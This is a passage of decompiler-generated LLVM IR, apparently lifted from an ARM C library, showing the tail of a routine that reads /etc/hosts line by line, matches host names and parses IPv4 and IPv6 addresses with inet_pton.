  %v1_16db8 = add i32 %v0_16db8, 32
  store i32 %v1_16db8, i32* @fp, align 4
  %v1_16dbc = add i32 %v0_16dbc, -32
  store i32 %v1_16dbc, i32* @r8, align 4
  br i1 %v7_16db4, label %dec_label_pc_16ee8, label %dec_label_pc_16dc4

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16db0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16dd0 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_16dd0, align 4
  %tmp80 = icmp ult i32 %v1_16dbc, 4
  br i1 %tmp80, label %dec_label_pc_1707c, label %dec_label_pc_16dd8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dc4
  %v0_16dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16dd8 = add i32 %v0_16dd8, -36
  store i32 %v1_16dd8, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_16dd8, 8
  br i1 %tmp81, label %dec_label_pc_1707c, label %dec_label_pc_16de4

dec_label_pc_16de4:                               ; preds = %dec_label_pc_16dd8
  %v0_16de4 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_16de4, 16
  br i1 %tmp82, label %dec_label_pc_1707c, label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %dec_label_pc_16de4
  %v1_16dec = add i32 %v0_16dd8, -48
  store i32 %v1_16dec, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_16dec, 8
  br i1 %tmp83, label %dec_label_pc_1707c, label %dec_label_pc_16df8

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16dec
  %v1_16df8 = add i32 %v0_16dd8, -44
  store i32 %v1_16df8, i32* @r8, align 4
  %v1_16dfc = add i32 %v0_16dd8, -56
  store i32 %v1_16dfc, i32* %r3.global-to-local, align 4
  %v3_16e00 = icmp ult i32 %v1_16dfc, %v1_16df8
  br i1 %v3_16e00, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16df8
  %v1_16e08 = load i32, i32* @r4, align 4
  %v2_16e08 = add i32 %v1_16e08, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_16df8
  store i32 %v1_16dfc, i32* @r8, align 4
  %v1_16e0c.pre = load i32, i32* @r4, align 4
  %v2_16e0c = add i32 %v1_16e0c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_16e0c, %.thread1 ], [ %v2_16e08, %bb ]
  %v0_16e14 = phi i32 [ %v1_16e0c.pre, %.thread1 ], [ %v1_16e08, %bb ]
  %v0_16e10 = phi i32 [ %v1_16dfc, %.thread1 ], [ %v1_16df8, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_16e14 = add i32 %v0_16e14, 36
  store i32 %v1_16e14, i32* @r6, align 4
  %v1_16e18 = add i32 %v0_16e14, 48
  store i32 %v1_16e18, i32* @sl, align 4
  %tmp84 = icmp ult i32 %v0_16e10, 80
  br i1 %tmp84, label %dec_label_pc_1707c, label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %bb74
  %v0_16e20 = call i32 @__open_etc_hosts()
  store i32 %v0_16e20, i32* %r0.global-to-local, align 4
  %v2_16e24 = icmp eq i32 %v0_16e20, 0
  br i1 %v2_16e24, label %dec_label_pc_16e40, label %.thread

.thread:                                          ; preds = %dec_label_pc_16e20
  %v1_16e2c = load i32, i32* @fp, align 4
  store i32 %v1_16e2c, i32* @r7, align 4
  %v1_16e30 = load i32, i32* @r5, align 4
  store i32 %v1_16e30, i32* @fp, align 4
  %v1_16e34 = load i32, i32* @r6, align 4
  %v1_16e38 = load i32, i32* @sl, align 4
  br label %dec_label_pc_16ef4

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e20
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_16e48 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_16e48, align 4
  %v0_16e4c = call i32 @__errno_location()
  store i32 %v0_16e4c, i32* %r0.global-to-local, align 4
  %v1_16e50 = inttoptr i32 %v0_16e4c to i32*
  %v2_16e50 = load i32, i32* %v1_16e50, align 4
  store i32 %v2_16e50, i32* @sl, align 4
  br label %dec_label_pc_17080

dec_label_pc_16e58:                               ; preds = %dec_label_pc_17008
  %v0_16e58 = load i32, i32* @r4, align 4
  %v1_16e58 = add i32 %v0_16e58, 4
  %v2_16e58 = inttoptr i32 %v1_16e58 to i32*
  %v3_16e58 = load i32, i32* %v2_16e58, align 4
  %v1_16e5c = load i32, i32* @sb, align 4
  %v2_16e5c = inttoptr i32 %v1_16e5c to i32*
  store i32 %v3_16e58, i32* %v2_16e5c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* @ip, align 4
  %v0_16e70 = load i32, i32* @r4, align 4
  %v1_16e70 = add i32 %v0_16e70, 8
  store i32 %v1_16e70, i32* %r1.global-to-local, align 4
  %v1_16e74 = load i32, i32* @sb, align 4
  %v2_16e74 = add i32 %v1_16e74, 8
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  store i32 2, i32* %v3_16e74, align 4
  %v0_16e78 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16e78, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_16e80 = load i32, i32* @sb, align 4
  %v1_16e80 = load i32, i32* @ip, align 4
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  store i32 %v0_16e80, i32* %v2_16e80, align 4
  %v0_16e84 = load i32, i32* @r7, align 4
  %v1_16e84 = load i32, i32* %r0.global-to-local, align 4
  %v2_16e84 = inttoptr i32 %v1_16e84 to i32*
  store i32 %v0_16e84, i32* %v2_16e84, align 4
  %v0_16e88 = load i32, i32* %r3.global-to-local, align 4
  %v1_16e88 = load i32, i32* @sb, align 4
  %v2_16e88 = add i32 %v1_16e88, 12
  %v3_16e88 = inttoptr i32 %v2_16e88 to i32*
  store i32 %v0_16e88, i32* %v3_16e88, align 4
  %v0_16e8c = load i32, i32* %r0.global-to-local, align 4
  %v1_16e8c = load i32, i32* @sb, align 4
  %v2_16e8c = add i32 %v1_16e8c, 16
  %v3_16e8c = inttoptr i32 %v2_16e8c to i32*
  store i32 %v0_16e8c, i32* %v3_16e8c, align 4
  %v0_16e90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e90 = load i32, i32* @sb, align 4
  %v2_16e90 = add i32 %v1_16e90, 4
  %v3_16e90 = inttoptr i32 %v2_16e90 to i32*
  store i32 %v0_16e90, i32* %v3_16e90, align 4
  %v0_16e94 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e94 = load i32, i32* %r0.global-to-local, align 4
  %v2_16e94 = add i32 %v1_16e94, 4
  %v3_16e94 = inttoptr i32 %v2_16e94 to i32*
  store i32 %v0_16e94, i32* %v3_16e94, align 4
  br label %dec_label_pc_17064

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_17030
  %v0_16ea0 = load i32, i32* @r4, align 4
  %v1_16ea0 = add i32 %v0_16ea0, 4
  %v2_16ea0 = inttoptr i32 %v1_16ea0 to i32*
  %v3_16ea0 = load i32, i32* %v2_16ea0, align 4
  store i32 %v3_16ea0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_16ea8 = load i32, i32* @sb, align 4
  %v2_16ea8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_16ea8, i32* %v2_16ea8, align 4
  store i32 %v0_16f00, i32* @ip, align 4
  %v0_16eb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16eb0 = load i32, i32* @sb, align 4
  %v2_16eb0 = inttoptr i32 %v1_16eb0 to i32*
  store i32 %v0_16eb0, i32* %v2_16eb0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16ebc = load i32, i32* @ip, align 4
  %v1_16ebc = load i32, i32* %r0.global-to-local, align 4
  %v2_16ebc = inttoptr i32 %v1_16ebc to i32*
  store i32 %v0_16ebc, i32* %v2_16ebc, align 4
  %v0_16ec0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16ec0 = load i32, i32* @sb, align 4
  %v2_16ec0 = add i32 %v1_16ec0, 12
  %v3_16ec0 = inttoptr i32 %v2_16ec0 to i32*
  store i32 %v0_16ec0, i32* %v3_16ec0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_16ecc = load i32, i32* @r4, align 4
  %v1_16ecc = add i32 %v0_16ecc, 8
  store i32 %v1_16ecc, i32* %r1.global-to-local, align 4
  %v0_16ed0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16ed0, i32* @sl, align 4
  %v1_16ed4 = load i32, i32* @sb, align 4
  %v2_16ed4 = add i32 %v1_16ed4, 8
  %v3_16ed4 = inttoptr i32 %v2_16ed4 to i32*
  store i32 10, i32* %v3_16ed4, align 4
  %v0_16ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_16ed8 = load i32, i32* @sb, align 4
  %v2_16ed8 = add i32 %v1_16ed8, 16
  %v3_16ed8 = inttoptr i32 %v2_16ed8 to i32*
  store i32 %v0_16ed8, i32* %v3_16ed8, align 4
  %v0_16edc = load i32, i32* %r1.global-to-local, align 4
  %v1_16edc = load i32, i32* @sb, align 4
  %v2_16edc = add i32 %v1_16edc, 4
  %v3_16edc = inttoptr i32 %v2_16edc to i32*
  store i32 %v0_16edc, i32* %v3_16edc, align 4
  %v0_16ee0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ee0 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ee0 = add i32 %v1_16ee0, 4
  %v3_16ee0 = inttoptr i32 %v2_16ee0 to i32*
  store i32 %v0_16ee0, i32* %v3_16ee0, align 4
  br label %dec_label_pc_17064

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16db0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %.thread, %dec_label_pc_16ee8
  %v2_16f04.pre-phi = phi i32* [ %v2_16dd0, %.thread ], [ %.pre, %dec_label_pc_16ee8 ]
  %v0_16f00 = phi i32 [ %v1_16e2c, %.thread ], [ 0, %dec_label_pc_16ee8 ]
  %stack_var_-40.1 = phi i32 [ %v1_16e38, %.thread ], [ 0, %dec_label_pc_16ee8 ]
  %stack_var_-48.1 = phi i32 [ %v1_16e34, %.thread ], [ 0, %dec_label_pc_16ee8 ]
  %stack_var_-52.0 = phi i32 [ %v0_16e20, %.thread ], [ %v0_16d80, %dec_label_pc_16ee8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* @ip, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_16f04.pre-phi, align 4
  %v2_16fc8 = inttoptr i32 %v0_16d84 to i8*
  %v7_17000 = icmp eq i32 %v0_16d7c, 2
  %v7_17028 = icmp eq i32 %v0_16d7c, 10
  br label %dec_label_pc_1704c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_1704c
  %v0_16f0c = load i32, i32* @fp, align 4
  store i32 %v0_16f0c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_16f14 = call i32 @__GI_strchr(i32 %v0_16f0c, i32 35)
  store i32 %v2_16f14, i32* %r0.global-to-local, align 4
  %v3_16f18 = icmp eq i32 %v2_16f14, 0
  br i1 %v3_16f18, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_16f0c
  %v0_16f2011 = load i32, i32* @fp, align 4
  store i32 %v0_16f2011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_16f8c.preheader

bb75:                                             ; preds = %dec_label_pc_16f0c
  %v3_16f14 = inttoptr i32 %v2_16f14 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16f20 = load i32, i32* @fp, align 4
  store i32 %v0_16f20, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_16f14, align 1
  %v0_16f8c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16f8c.preheader

dec_label_pc_16f8c.preheader:                     ; preds = %bb75, %.thread10
  %v0_16f8c30 = phi i32 [ %v0_16f8c30.pre, %bb75 ], [ %v0_16f2011, %.thread10 ]
  %v1_16f8c31 = inttoptr i32 %v0_16f8c30 to i8*
  %v2_16f8c32 = load i8, i8* %v1_16f8c31, align 1
  %v3_16f8c33 = zext i8 %v2_16f8c32 to i32
  store i32 %v3_16f8c33, i32* %r3.global-to-local, align 4
  %v2_16f9034 = icmp eq i8 %v2_16f8c32, 0
  br i1 %v2_16f9034, label %dec_label_pc_16f98, label %dec_label_pc_16f38.preheader

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f44
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16f34 = inttoptr i32 %v8_16f5c to i8*
  store i8 0, i8* %v3_16f34, align 1
  %v4_16f34 = load i32, i32* %r2.global-to-local, align 4
  %v5_16f34 = add i32 %v4_16f34, 1
  store i32 %v5_16f34, i32* %r2.global-to-local, align 4
  %v1_16f38 = inttoptr i32 %v5_16f34 to i8*
  %v2_16f38 = load i8, i8* %v1_16f38, align 1
  %v3_16f38 = zext i8 %v2_16f38 to i32
  store i32 %v3_16f38, i32* %r1.global-to-local, align 4
  %v2_16f3c = icmp eq i8 %v2_16f38, 0
  br i1 %v2_16f3c, label %dec_label_pc_16f98, label %dec_label_pc_16f44

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16f38.preheader, %dec_label_pc_16f30
  %v8_16f5c = phi i32 [ %v5_16f34, %dec_label_pc_16f30 ], [ %v0_16f3820, %dec_label_pc_16f38.preheader ]
  %v1_16f4c = phi i32 [ %v3_16f38, %dec_label_pc_16f30 ], [ %v3_16f3823, %dec_label_pc_16f38.preheader ]
  %v2_16f48 = load i32, i32* @global_var_224e8, align 4
  store i32 %v2_16f48, i32* %r3.global-to-local, align 4
  %v3_16f4c = mul nuw nsw i32 %v1_16f4c, 2
  %v4_16f4c = add i32 %v3_16f4c, %v2_16f48
  %v5_16f4c = inttoptr i32 %v4_16f4c to i8*
  %v6_16f4c = load i8, i8* %v5_16f4c, align 1
  %v8_16f4c = zext i8 %v6_16f4c to i32
  store i32 %v8_16f4c, i32* %r3.global-to-local, align 4
  %v1_16f50 = and i32 %v8_16f4c, 32
  %v2_16f50 = icmp eq i32 %v1_16f50, 0
  br i1 %v2_16f50, label %dec_label_pc_16f58, label %dec_label_pc_16f30

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16f44
  %v0_16f58 = load i32, i32* @r6, align 4
  %v7_16f5c = icmp slt i32 %v0_16f58, 7
  br i1 %v7_16f5c, label %bb76, label %dec_label_pc_16f6c.preheader

bb76:                                             ; preds = %dec_label_pc_16f58
  %v9_16f5c = load i32, i32* @r4, align 4
  %v13_16f5c = mul i32 %v0_16f58, 4
  %v14_16f5c = add i32 %v9_16f5c, %v13_16f5c
  %v15_16f5c = inttoptr i32 %v14_16f5c to i32*
  store i32 %v8_16f5c, i32* %v15_16f5c, align 4
  %v8_16f60 = load i32, i32* @r6, align 4
  %v9_16f60 = add i32 %v8_16f60, 1
  store i32 %v9_16f60, i32* @r6, align 4
  %v0_16f6c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16f6c.preheader

dec_label_pc_16f6c.preheader:                     ; preds = %bb76, %dec_label_pc_16f58
  %v0_16f6c25 = phi i32 [ %v0_16f6c25.pre, %bb76 ], [ %v8_16f5c, %dec_label_pc_16f58 ]
  %v1_16f6c26 = inttoptr i32 %v0_16f6c25 to i8*
  %v2_16f6c27 = load i8, i8* %v1_16f6c26, align 1
  %v3_16f6c28 = zext i8 %v2_16f6c27 to i32
  store i32 %v3_16f6c28, i32* %r1.global-to-local, align 4
  %v2_16f7029 = icmp eq i8 %v2_16f6c27, 0
  br i1 %v2_16f7029, label %dec_label_pc_16f8c.loopexit, label %dec_label_pc_16f78.lr.ph

dec_label_pc_16f78.lr.ph:                         ; preds = %dec_label_pc_16f6c.preheader
  %v2_16f7c.pre = load i32, i32* @global_var_224e8, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f78
  %v1_16f68 = add i32 %v0_16f68, 1
  store i32 %v1_16f68, i32* %r2.global-to-local, align 4
  %v1_16f6c = inttoptr i32 %v1_16f68 to i8*
  %v2_16f6c = load i8, i8* %v1_16f6c, align 1
  %v3_16f6c = zext i8 %v2_16f6c to i32
  store i32 %v3_16f6c, i32* %r1.global-to-local, align 4
  %v2_16f70 = icmp eq i8 %v2_16f6c, 0
  br i1 %v2_16f70, label %dec_label_pc_16f8c.loopexit, label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16f78.lr.ph, %dec_label_pc_16f68
  %v0_16f68 = phi i32 [ %v0_16f6c25, %dec_label_pc_16f78.lr.ph ], [ %v1_16f68, %dec_label_pc_16f68 ]
  %v1_16f80 = phi i32 [ %v3_16f6c28, %dec_label_pc_16f78.lr.ph ], [ %v3_16f6c, %dec_label_pc_16f68 ]
  store i32 %v2_16f7c.pre, i32* %r3.global-to-local, align 4
  %v3_16f80 = mul nuw nsw i32 %v1_16f80, 2
  %v4_16f80 = add i32 %v3_16f80, %v2_16f7c.pre
  %v5_16f80 = inttoptr i32 %v4_16f80 to i8*
  %v6_16f80 = load i8, i8* %v5_16f80, align 1
  %v8_16f80 = zext i8 %v6_16f80 to i32
  store i32 %v8_16f80, i32* %r3.global-to-local, align 4
  %v1_16f84 = and i32 %v8_16f80, 32
  %v2_16f84 = icmp eq i32 %v1_16f84, 0
  br i1 %v2_16f84, label %dec_label_pc_16f68, label %dec_label_pc_16f8c.loopexit

dec_label_pc_16f8c.loopexit:                      ; preds = %dec_label_pc_16f78, %dec_label_pc_16f68, %dec_label_pc_16f6c.preheader
  %v0_16f8c = phi i32 [ %v0_16f6c25, %dec_label_pc_16f6c.preheader ], [ %v0_16f68, %dec_label_pc_16f78 ], [ %v1_16f68, %dec_label_pc_16f68 ]
  %v1_16f8c = inttoptr i32 %v0_16f8c to i8*
  %v2_16f8c = load i8, i8* %v1_16f8c, align 1
  %v3_16f8c = zext i8 %v2_16f8c to i32
  store i32 %v3_16f8c, i32* %r3.global-to-local, align 4
  %v2_16f90 = icmp eq i8 %v2_16f8c, 0
  br i1 %v2_16f90, label %dec_label_pc_16f98, label %dec_label_pc_16f38.preheader

dec_label_pc_16f38.preheader:                     ; preds = %dec_label_pc_16f8c.preheader, %dec_label_pc_16f8c.loopexit
  %v0_16f3820 = phi i32 [ %v0_16f8c, %dec_label_pc_16f8c.loopexit ], [ %v0_16f8c30, %dec_label_pc_16f8c.preheader ]
  %v1_16f3821 = inttoptr i32 %v0_16f3820 to i8*
  %v2_16f3822 = load i8, i8* %v1_16f3821, align 1
  %v3_16f3823 = zext i8 %v2_16f3822 to i32
  store i32 %v3_16f3823, i32* %r1.global-to-local, align 4
  %v2_16f3c24 = icmp eq i8 %v2_16f3822, 0
  br i1 %v2_16f3c24, label %dec_label_pc_16f98, label %dec_label_pc_16f44

dec_label_pc_16f98:                               ; preds = %dec_label_pc_16f8c.loopexit, %dec_label_pc_16f38.preheader, %dec_label_pc_16f30, %dec_label_pc_16f8c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16f9c = load i32, i32* @r6, align 4
  %v1_16fa0 = load i32, i32* @r4, align 4
  %v5_16fa0 = mul i32 %v0_16f9c, 4
  %v6_16fa0 = add i32 %v1_16fa0, %v5_16fa0
  %v7_16fa0 = inttoptr i32 %v6_16fa0 to i32*
  store i32 0, i32* %v7_16fa0, align 4
  %v7_16fa4 = icmp sgt i32 %v0_16f9c, 1
  br i1 %v7_16fa4, label %dec_label_pc_16fa8, label %dec_label_pc_1704c

dec_label_pc_16fa8:                               ; preds = %dec_label_pc_16f98
  %v2_16fa8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_16fa8, i32* %r0.global-to-local, align 4
  %v7_16fac = icmp eq i32 %v2_16fa8, 1
  br i1 %v7_16fac, label %dec_label_pc_17080, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16fa8
  %v7_16fb4 = icmp eq i32 %v2_16fa8, 2
  br i1 %v7_16fb4, label %dec_label_pc_16fc0, label %dec_label_pc_16fec.preheader

dec_label_pc_16fec.preheader:                     ; preds = %dec_label_pc_16fb4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16fec

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_16fb4
  store i32 %v0_16d84, i32* %r0.global-to-local, align 4
  %v0_16fc4 = load i32, i32* @r4, align 4
  %v1_16fc4 = inttoptr i32 %v0_16fc4 to i32*
  %v2_16fc4 = load i32, i32* %v1_16fc4, align 4
  store i32 %v2_16fc4, i32* @r1, align 4
  %v3_16fc8 = call i32 @__GI_strcoll(i8* %v2_16fc8, i32 %v2_16fc4)
  store i32 %v3_16fc8, i32* %r0.global-to-local, align 4
  %v2_16fcc = icmp eq i32 %v3_16fc8, 0
  br i1 %v2_16fcc, label %dec_label_pc_16ffc, label %dec_label_pc_1704c

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fec
  %v0_16fd8 = load i32, i32* @r4, align 4
  %v4_16fd8 = mul i32 %v1_16fd8, 4
  %v5_16fd8 = add i32 %v0_16fd8, %v4_16fd8
  %v6_16fd8 = inttoptr i32 %v5_16fd8 to i32*
  %v7_16fd8 = load i32, i32* %v6_16fd8, align 4
  store i32 %v7_16fd8, i32* %r1.global-to-local, align 4
  %v3_16fdc = call i32 @__GI_strcasecmp(i8* %v2_16fc8, i32 %v7_16fd8)
  store i32 %v3_16fdc, i32* %r0.global-to-local, align 4
  %v2_16fe0 = icmp eq i32 %v3_16fdc, 0
  %v0_16fe4 = load i32, i32* @r5, align 4
  %v1_16fe4 = add i32 %v0_16fe4, 1
  store i32 %v1_16fe4, i32* @r5, align 4
  br i1 %v2_16fe0, label %dec_label_pc_16ffc, label %dec_label_pc_16fec

dec_label_pc_16fec:                               ; preds = %dec_label_pc_16fec.preheader, %dec_label_pc_16fd8
  %v1_16fd8 = phi i32 [ 1, %dec_label_pc_16fec.preheader ], [ %v1_16fe4, %dec_label_pc_16fd8 ]
  %v1_16fec = load i32, i32* @r6, align 4
  store i32 %v0_16d84, i32* %r0.global-to-local, align 4
  %v5_16ff4 = icmp slt i32 %v1_16fd8, %v1_16fec
  br i1 %v5_16ff4, label %dec_label_pc_16fd8, label %dec_label_pc_1704c

dec_label_pc_16ffc:                               ; preds = %dec_label_pc_16fd8, %dec_label_pc_16fc0
  store i32 %v0_16d7c, i32* %r1.global-to-local, align 4
  br i1 %v7_17000, label %dec_label_pc_17008, label %dec_label_pc_17024

dec_label_pc_17008:                               ; preds = %dec_label_pc_16ffc
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1700c = load i32, i32* @r7, align 4
  store i32 %v0_1700c, i32* %r2.global-to-local, align 4
  %v0_17010 = load i32, i32* @r4, align 4
  %v1_17010 = inttoptr i32 %v0_17010 to i32*
  %v2_17010 = load i32, i32* %v1_17010, align 4
  store i32 %v2_17010, i32* %r1.global-to-local, align 4
  %v3_17014 = inttoptr i32 %v2_17010 to i8*
  %v4_17014 = call i32 @inet_pton(i32 2, i8* %v3_17014, i32 %v0_1700c)
  store i32 %v4_17014, i32* %r0.global-to-local, align 4
  %v5_1701c = icmp sgt i32 %v4_17014, 0
  br i1 %v5_1701c, label %dec_label_pc_16e58, label %dec_label_pc_17048

dec_label_pc_17024:                               ; preds = %dec_label_pc_16ffc
  store i32 %v0_16d7c, i32* %r2.global-to-local, align 4
  br i1 %v7_17028, label %dec_label_pc_17030, label %dec_label_pc_17048

dec_label_pc_17030:                               ; preds = %dec_label_pc_17024
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_17034 = load i32, i32* @r4, align 4
  %v1_17034 = inttoptr i32 %v0_17034 to i32*
  %v2_17034 = load i32, i32* %v1_17034, align 4
  store i32 %v2_17034, i32* %r1.global-to-local, align 4
  store i32 %v0_16f00, i32* %r2.global-to-local, align 4
  %v3_1703c = inttoptr i32 %v2_17034 to i8*
  %v4_1703c = call i32 @inet_pton(i32 10, i8* %v3_1703c, i32 %v0_16f00)
  store i32 %v4_1703c, i32* %r0.global-to-local, align 4
  %v5_17044 = icmp sgt i32 %v4_1703c, 0
  br i1 %v5_17044, label %dec_label_pc_16e9c, label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_17008, %dec_label_pc_17024, %dec_label_pc_17030
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1704c

dec_label_pc_1704c:                               ; preds = %dec_label_pc_16fec, %dec_label_pc_16fc0, %dec_label_pc_16f98, %dec_label_pc_17048, %dec_label_pc_16ef4
  %v0_1704c = load i32, i32* @fp, align 4
  store i32 %v0_1704c, i32* %r0.global-to-local, align 4
  %v0_17050 = load i32, i32* @r8, align 4
  store i32 %v0_17050, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_17058 = call i32 @fgets(i32 %v0_1704c, i32 %v0_17050, i32 %stack_var_-52.0)
  store i32 %v3_17058, i32* %r0.global-to-local, align 4
  %v2_1705c = icmp eq i32 %v3_17058, 0
  br i1 %v2_1705c, label %dec_label_pc_17064, label %dec_label_pc_16f0c

dec_label_pc_17064:                               ; preds = %dec_label_pc_1704c, %dec_label_pc_16e9c, %dec_label_pc_16e58
  %v2_17064 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17064, i32* %r3.global-to-local, align 4
  %v7_17068 = icmp eq i32 %v2_17064, 1
  br i1 %v7_17068, label %dec_label_pc_17080, label %dec_label_pc_17070

dec_label_pc_17070:                               ; preds = %dec_label_pc_17064
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_17074 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_17074 = call i32 @__GI_fclose(i8* %v1_17074)
  store i32 %v2_17074, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17080

dec_label_pc_1707c:                               ; preds = %dec_label_pc_16d98, %bb74, %dec_label_pc_16dec, %dec_label_pc_16de4, %dec_label_pc_16dd8, %dec_label_pc_16dc4, %dec_label_pc_16da8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_17080

dec_label_pc_17080:                               ; preds = %dec_label_pc_16fa8, %dec_label_pc_17064, %dec_label_pc_16e40, %dec_label_pc_17070, %dec_label_pc_1707c
  %v0_17080 = load i32, i32* @sl, align 4
  store i32 %v0_17080, i32* %r0.global-to-local, align 4
  store i32 %v3_16d68, i32* @r4, align 4
  store i32 %v6_16d68, i32* @r5, align 4
  store i32 %v12_16d68, i32* @r7, align 4
  store i32 %v15_16d68, i32* @r8, align 4
  store i32 %v21_16d68, i32* @sl, align 4
  store i32 %v24_16d68, i32* @fp, align 4
  ret i32 %v0_17080

; uselistorder directives
  uselistorder i32 %v1_16fd8, { 1, 0 }
  uselistorder i32 %v0_16f9c, { 1, 0 }
  uselistorder i32 %v3_16f3823, { 1, 0 }
  uselistorder i32 %v0_16f3820, { 1, 0 }
  uselistorder i32 %v2_16f14, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_16e14, { 1, 0 }
  uselistorder i32 %v0_16dd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16dbc, { 1, 0 }
  uselistorder i32 %v0_16d88, { 1, 0, 2 }
  uselistorder i32 %v0_16d7c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16d78, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 15, 1, 7, 2, 3, 4, 5, 6, 0, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 10, 11, 12, 13, 14 }
  uselistorder i32* %r2.global-to-local, { 7, 15, 16, 20, 1, 3, 2, 5, 4, 6, 0, 12, 13, 14, 17, 18, 19, 8, 10, 9, 11 }
  uselistorder i32* %r1.global-to-local, { 5, 9, 12, 13, 14, 0, 2, 1, 3, 4, 7, 8, 10, 11, 6 }
  uselistorder i32* %r0.global-to-local, { 8, 13, 9, 4, 3, 19, 14, 21, 20, 22, 23, 25, 24, 0, 2, 1, 10, 11, 12, 15, 16, 17, 18, 5, 7, 6 }
  uselistorder i32 34, { 6, 2, 3, 0, 7, 8, 5, 1, 4 }
  uselistorder i32 (i8*)* @__GI_fclose, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 1, 0, 2 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 20, 16, 17, 18, 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
